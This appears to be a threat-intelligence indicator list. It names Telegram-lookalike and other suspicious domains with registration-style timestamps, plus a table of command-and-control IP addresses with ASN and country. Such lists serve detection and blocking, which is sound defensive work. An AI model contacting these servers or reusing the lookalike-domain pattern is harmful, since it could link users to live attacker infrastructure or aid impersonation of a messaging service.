ak-telegram.com|2020-11-05T06:31:22Z|
a3-telegram.com|2020-11-05T06:31:22Z|
a1-telegram.com|2020-11-05T06:31:22Z|
tt-telegram.com|2020-11-05T06:31:24Z|
kk-telegram.com|2020-11-05T06:31:24Z|
potato.fit|2020-12-01T02:06:07Z|
a6-telegram.com|2020-12-01T08:36:30Z|
a7-telegram.com|2020-12-03T05:55:37Z|
potato.red|2020-12-09T10:21:14Z|
apotato.net|2020-12-15T02:30:16Z|
apotato.xyz|2020-12-15T02:30:17Z|
ll-telegram.com|2020-12-16T12:11:04Z|
c3-telegram.com|2020-12-19T03:31:02Z|
g3telegram.com|2020-12-28T10:28:02Z|
telecnsr.com|2020-12-30T09:00:07Z|
dlyunsvr.com|2021-01-05T04:41:42Z|
kelectsv.com|2021-01-05T04:41:42Z|

C2 IP|ASN|Country|
:|:|:|
103.37.0.178|136800|CN|
154.222.103.58|136800|HK|
154.222.103.59|136800|HK|
154.222.103.60|136800|HK|
156.255.212.187|136800|HK|
156.255.212.190|136800|HK|
175.24.112.88|45090|CN|
185.224.168.130|132721|HK|
185.224.168.131|132721|HK|
185.224.168.132|132721|HK|
202.87.221.102|24321|MY|
45.64.54.85|38197|HK|
